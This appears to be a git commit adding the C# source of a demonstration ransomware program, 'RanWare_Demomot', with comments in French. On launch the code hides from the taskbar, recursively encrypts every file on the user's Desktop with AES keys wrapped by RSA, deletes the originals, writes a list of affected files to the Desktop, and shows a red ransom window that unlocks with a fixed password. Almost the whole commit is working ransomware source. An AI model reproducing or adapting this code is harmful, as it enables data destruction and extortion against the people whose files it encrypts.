8635f4ded6712cc0a4a11f26161991c326af5066
Admin <Admin@DESKTOP-JRUF9PL>
2022-06-03 12:52:48 +0200

    Ajoutez des fichiers projet.

---
+++ RanWare_Demomot/Form1.Designer.cs
@@ -0,0 +1,146 @@
+﻿namespace RanWare_Demomot
+{
+    partial class Form1
+    {
+        /// <summary>
+        ///  Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        ///  Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        ///  Required method for Designer support - do not modify
+        ///  the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.btnDecrypt = new System.Windows.Forms.Button();
+            this.txtBoxInput = new System.Windows.Forms.TextBox();
+            this.lblTextMessage = new System.Windows.Forms.Label();
+            this.pictureBox1 = new System.Windows.Forms.PictureBox();
+            this.lblTextFile = new System.Windows.Forms.Label();
+            this.lblNbr = new System.Windows.Forms.Label();
+            this.pictureBox2 = new System.Windows.Forms.PictureBox();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // btnDecrypt
+            // 
+            this.btnDecrypt.Location = new System.Drawing.Point(590, 369);
+            this.btnDecrypt.Name = "btnDecrypt";
+            this.btnDecrypt.Size = new System.Drawing.Size(75, 23);
+            this.btnDecrypt.TabIndex = 0;
+            this.btnDecrypt.Text = "Decrypt :)";
+            this.btnDecrypt.UseVisualStyleBackColor = true;
+            this.btnDecrypt.Click += new System.EventHandler(this.btnDecrypt_Click);
+            // 
+            // txtBoxInput
+            // 
+            this.txtBoxInput.Location = new System.Drawing.Point(412, 369);
+            this.txtBoxInput.Name = "txtBoxInput";
+            this.txtBoxInput.Size = new System.Drawing.Size(100, 23);
+            this.txtBoxInput.TabIndex = 1;
+            // 
+            // lblTextMessage
+            // 
+            this.lblTextMessage.Font = new System.Drawing.Font("Times New Roman", 24F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point);
+            this.lblTextMessage.ForeColor = System.Drawing.Color.White;
+            this.lblTextMessage.Location = new System.Drawing.Point(244, 9);
+            this.lblTextMessage.Name = "lblTextMessage";
+            this.lblTextMessage.Size = new System.Drawing.Size(555, 303);
+            this.lblTextMessage.TabIndex = 2;
+            this.lblTextMessage.Text = resources.GetString("lblTextMessage.Text");
+            // 
+            // pictureBox1
+            // 
+            this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
+            this.pictureBox1.Location = new System.Drawing.Point(31, 9);
+            this.pictureBox1.Name = "pictureBox1";
+            this.pictureBox1.Size = new System.Drawing.Size(121, 130);
+            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
+            this.pictureBox1.TabIndex = 3;
+            this.pictureBox1.TabStop = false;
+            // 
+            // lblTextFile
+            // 
+            this.lblTextFile.AutoSize = true;
+            this.lblTextFile.ForeColor = System.Drawing.Color.White;
+            this.lblTextFile.Location = new System.Drawing.Point(1, 164);
+            this.lblTextFile.Name = "lblTextFile";
+            this.lblTextFile.Size = new System.Drawing.Size(165, 15);
+            this.lblTextFile.TabIndex = 4;
+            this.lblTextFile.Text = "Nombre de fichiers encryptés:";
+            // 
+            // lblNbr
+            // 
+            this.lblNbr.AutoSize = true;
+            this.lblNbr.BackColor = System.Drawing.Color.DarkRed;
+            this.lblNbr.ForeColor = System.Drawing.Color.White;
+            this.lblNbr.Location = new System.Drawing.Point(171, 164);
+            this.lblNbr.Name = "lblNbr";
+            this.lblNbr.Size = new System.Drawing.Size(0, 15);
+            this.lblNbr.TabIndex = 5;
+            // 
+            // pictureBox2
+            // 
+            this.pictureBox2.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox2.Image")));
+            this.pictureBox2.Location = new System.Drawing.Point(12, 221);
+            this.pictureBox2.Name = "pictureBox2";
+            this.pictureBox2.Size = new System.Drawing.Size(140, 121);
+            this.pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
+            this.pictureBox2.TabIndex = 6;
+            this.pictureBox2.TabStop = false;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(7F, 15F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.Color.DarkRed;
+            this.ClientSize = new System.Drawing.Size(800, 410);
+            this.Controls.Add(this.pictureBox2);
+            this.Controls.Add(this.lblNbr);
+            this.Controls.Add(this.lblTextFile);
+            this.Controls.Add(this.pictureBox1);
+            this.Controls.Add(this.lblTextMessage);
+            this.Controls.Add(this.txtBoxInput);
+            this.Controls.Add(this.btnDecrypt);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.MaximizeBox = false;
+            this.MinimizeBox = false;
+            this.Name = "Form1";
+            this.Text = "Petit Poney";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).EndInit();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private Button btnDecrypt;
+        private TextBox txtBoxInput;
+        private Label lblTextMessage;
+        private PictureBox pictureBox1;
+        private Label lblTextFile;
+        private Label lblNbr;
+        private PictureBox pictureBox2;
+    }
+}
---
+++ RanWare_Demomot/Form1.cs
@@ -0,0 +1,334 @@
+using System.IO;
+using System.Text;
+using System.Security.Cryptography;
+
+namespace RanWare_Demomot
+{
+    public partial class Form1 : Form
+    {
+        // Declare CspParmeters and RsaCryptoServiceProvider
+        // objects with global scope of your Form class.
+        readonly CspParameters cspP = new CspParameters();
+        RSACryptoServiceProvider rsa;
+
+
+        List<string> filesName = new List<string>();//Liste qui va contenir les nom des fichiers
+        int numberOfFiles;//Variables pour conter le nombre de fichiers encryptés
+
+        
+
+        const bool ENCRYPT_DESKTOP = true;//Encrypte le bureau
+        const bool DECRYPT_DESKTOP = true;//Decrypte le bureau
+        const bool ENCRYPT_DOCUMENTS = false;//Encrypte les documents
+        const bool DECRYPT_DOCUMENTS = false;//Derypte les documents
+        const bool ENCRYPT_PICTURES = false;//Encrypte les images
+        const bool DECRYPT_PICTURES = false;//Decrypte les images
+        const string KEYNAME = "Password1";
+        const string ENCRYPTED_FILE_EXTENSION = ".titi";
+        //// Public key file
+        //const string PubKeyFile = @"c:\encrypt\rsaPublicKey.txt";
+
+        string Desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
+        string Documents = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+        string Pictures = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
+
+        
+
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            this.ShowInTaskbar = false;//Pas d'îcone dans la barre des tâches
+
+            if (ENCRYPT_DESKTOP)
+            {
+                encryptFolderFiles(Desktop);
+            }
+
+            if (ENCRYPT_PICTURES)
+            {
+                encryptFolderFiles(Pictures);
+            }
+
+            if (ENCRYPT_DOCUMENTS)
+            {
+                encryptFolderFiles(Documents);
+            }
+
+            lblNbr.Text = Convert.ToString(numberOfFiles);
+
+            if (numberOfFiles > 0)
+            {
+                ransomLetter(filesName);
+            }
+            
+        }
+
+        /// <summary>
+        /// Envoi chaque fichier du repertoire à la méthode qui les encryptes
+        /// </summary>
+        /// <param name="sDir"></param>
+        private void encryptFolderFiles(string sDir)
+        {
+            // Stores a key pair in the key container.
+            cspP.KeyContainerName = KEYNAME;
+            rsa = new RSACryptoServiceProvider(cspP)
+            {
+                PersistKeyInCsp = true
+            };
+
+            foreach (string f in Directory.GetFiles(sDir))
+            {
+                if (!f.Contains(ENCRYPTED_FILE_EXTENSION))
+                {
+                    EncryptFile(new FileInfo (f));
+                }
+            }
+
+            foreach (string d in Directory.GetDirectories(sDir))
+            {
+                encryptFolderFiles(d);
+            }
+        }
+
+        /// <summary>
+        /// Encrypte le fichier (AES)
+        /// </summary>
+        /// <param name="inputFile"></param>Fichier à encrypter
+        private void EncryptFile(FileInfo inputFile)
+        {
+            if (inputFile.Extension != ".ini" && inputFile.Name != "RECOVER_FILES.txt")
+            {
+                // Create instance of Aes for
+                // symmetric encryption of the data.
+                Aes aes = Aes.Create();
+                ICryptoTransform transform = aes.CreateEncryptor();
+
+                // Use RSACryptoServiceProvider to
+                // encrypt the AES key.
+                // rsa is previously instantiated:
+                //    rsa = new RSACryptoServiceProvider(cspp);
+                byte[] keyEncrypted = rsa.Encrypt(aes.Key, false);
+
+                // Create byte arrays to contain
+                // the length values of the key and IV.
+                int lKey = keyEncrypted.Length;
+                byte[] LenK = BitConverter.GetBytes(lKey);
+                int lIV = aes.IV.Length;
+                byte[] LenIV = BitConverter.GetBytes(lIV);
+
+                // Write the following to the FileStream
+                // for the encrypted file (outFs):
+                // - length of the key
+                // - length of the IV
+                // - ecrypted key
+                // - the IV
+                // - the encrypted cipher content
+
+                // Crée le nouveau fichier encrypter
+                //string outFile = Path.Combine(Path.ChangeExtension(inputFile.Name, ENCRYPTED_FILE_EXTENSION));//Original
+
+                string testPath = Path.GetFullPath(inputFile.FullName);
+                string outFile = Path.Combine(testPath);
+
+                //Va ecrire dans le nouveau fichier le message encrypter
+                using (var outFs = new FileStream(outFile + ENCRYPTED_FILE_EXTENSION, FileMode.Create))//Crée le nouveau fichier (nom du fichier + ancienne extention.nouvell extention)
+                {
+                    outFs.Write(LenK, 0, 4);
+                    outFs.Write(LenIV, 0, 4);
+                    outFs.Write(keyEncrypted, 0, lKey);
+                    outFs.Write(aes.IV, 0, lIV);
+
+                    // Now write the cipher text using
+                    // a CryptoStream for encrypting.
+                    using (var outStreamEncrypted =
+                        new CryptoStream(outFs, transform, CryptoStreamMode.Write))
+                    {
+                        // By encrypting a chunk at
+                        // a time, you can save memory
+                        // and accommodate large files.
+                        int count = 0;
+                        int offset = 0;
+
+                        // blockSizeBytes can be any arbitrary size.
+                        int blockSizeBytes = aes.BlockSize / 8;
+                        byte[] data = new byte[blockSizeBytes];
+                        int bytesRead = 0;
+
+                        using (var inFs = new FileStream(inputFile.FullName, FileMode.Open))
+                        {
+                            do
+                            {
+                                count = inFs.Read(data, 0, blockSizeBytes);
+                                offset += count;
+                                outStreamEncrypted.Write(data, 0, count);
+                                bytesRead += blockSizeBytes;
+                            } while (count > 0);
+                        }
+                        outStreamEncrypted.FlushFinalBlock();
+                    }
+                }
+                filesName.Add(inputFile.FullName);//Ajoute le fichier encrypté à la liste
+                numberOfFiles++;
+                File.Delete(inputFile.FullName);
+            }
+        }
+
+        /// <summary>
+        /// Envoi chaque fichier du repertoire à la méthode qui les decryptes
+        /// </summary>
+        /// <param name="sDir"></param>Répertoire ou l'on veut chercher les fichiers à dercrypter
+        private void decryptFolderFiles(string sDir)
+        {
+            foreach (string f in Directory.GetFiles(sDir))
+            {
+                if (f.Contains(ENCRYPTED_FILE_EXTENSION))
+                {
+                    DecryptFile(new FileInfo(f));
+                }
+            }
+
+            foreach (string d in Directory.GetDirectories(sDir))
+            {
+                decryptFolderFiles(d);
+            }
+        }
+
+        /// <summary>
+        /// Quand l'utilisateur clique sur le bouton decrypt, si le mot de passe est le bon, va appeler la methode qui va chercher tous le fichiers d'un répertoire et les envoyer à la methode qui les encrypte
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void btnDecrypt_Click(object sender, EventArgs e)
+        {
+            if (txtBoxInput.Text == "Decrypt")
+            {
+                if (DECRYPT_DESKTOP)
+                {
+                    decryptFolderFiles(Desktop);
+                }
+
+                if (DECRYPT_PICTURES)
+                {
+                    decryptFolderFiles(Pictures);
+                }
+            }
+            else
+            {
+                MessageBox.Show("Bien essayé");
+            }
+        }
+
+        /// <summary>
+        /// Decrypt le fichier
+        /// </summary>
+        /// <param name="file"></param>Fichier à decrypter
+        private void DecryptFile(FileInfo file)
+        {
+            // Create instance of Aes for
+            // symmetric decryption of the data.
+            Aes aes = Aes.Create();
+
+            // Create byte arrays to get the length of
+            // the encrypted key and IV.
+            // These values were stored as 4 bytes each
+            // at the beginning of the encrypted package.
+            byte[] LenK = new byte[4];
+            byte[] LenIV = new byte[4];
+
+            // Construct the file name for the decrypted file.
+            string outFile =
+                Path.ChangeExtension(file.FullName.Replace("Encrypt", "Decrypt"), "");
+
+            // Use FileStream objects to read the encrypted
+            // file (inFs) and save the decrypted file (outFs).
+            using (var inFs = new FileStream(file.FullName, FileMode.Open))
+            {
+                inFs.Seek(0, SeekOrigin.Begin);
+                inFs.Read(LenK, 0, 3);
+                inFs.Seek(4, SeekOrigin.Begin);
+                inFs.Read(LenIV, 0, 3);
+
+                // Convert the lengths to integer values.
+                int lenK = BitConverter.ToInt32(LenK, 0);
+                int lenIV = BitConverter.ToInt32(LenIV, 0);
+
+                // Determine the start postition of
+                // the ciphter text (startC)
+                // and its length(lenC).
+                int startC = lenK + lenIV + 8;
+                int lenC = (int)inFs.Length - startC;
+
+                // Create the byte arrays for
+                // the encrypted Aes key,
+                // the IV, and the cipher text.
+                byte[] KeyEncrypted = new byte[lenK];
+                byte[] IV = new byte[lenIV];
+
+                // Extract the key and IV
+                // starting from index 8
+                // after the length values.
+                inFs.Seek(8, SeekOrigin.Begin);
+                inFs.Read(KeyEncrypted, 0, lenK);
+                inFs.Seek(8 + lenK, SeekOrigin.Begin);
+                inFs.Read(IV, 0, lenIV);
+
+                //Directory.CreateDirectory(DecrFolder);
+                // Use RSACryptoServiceProvider
+                // to decrypt the AES key.
+                byte[] KeyDecrypted = rsa.Decrypt(KeyEncrypted, false);
+
+                // Decrypt the key.
+                ICryptoTransform transform = aes.CreateDecryptor(KeyDecrypted, IV);
+
+                // Decrypt the cipher text from
+                // from the FileSteam of the encrypted
+                // file (inFs) into the FileStream
+                // for the decrypted file (outFs).
+                using (var outFs = new FileStream(outFile, FileMode.Create))
+                {
+                    int count = 0;
+                    int offset = 0;
+
+                    // blockSizeBytes can be any arbitrary size.
+                    int blockSizeBytes = aes.BlockSize / 8;
+                    byte[] data = new byte[blockSizeBytes];
+
+                    // By decrypting a chunk a time,
+                    // you can save memory and
+                    // accommodate large files.
+
+                    // Start at the beginning
+                    // of the cipher text.
+                    inFs.Seek(startC, SeekOrigin.Begin);
+                    using (var outStreamDecrypted =
+                        new CryptoStream(outFs, transform, CryptoStreamMode.Write))
+                    {
+                        do
+                        {
+                            count = inFs.Read(data, 0, blockSizeBytes);
+                            offset += count;
+                            outStreamDecrypted.Write(data, 0, count);
+                        } while (count > 0);
+                        outStreamDecrypted.FlushFinalBlock();
+                    }
+                }
+            }
+            File.Delete(file.FullName);
+        }
+
+        private void ransomLetter(List<string> files)
+        {
+            StreamWriter ransomWriter = new StreamWriter(Desktop + @"\RECOVER_FILES.txt");
+            foreach (string fileName in files)
+            {
+                ransomWriter.WriteLine(fileName);
+            }
+
+            ransomWriter.Close();
+        }
+    }
+}
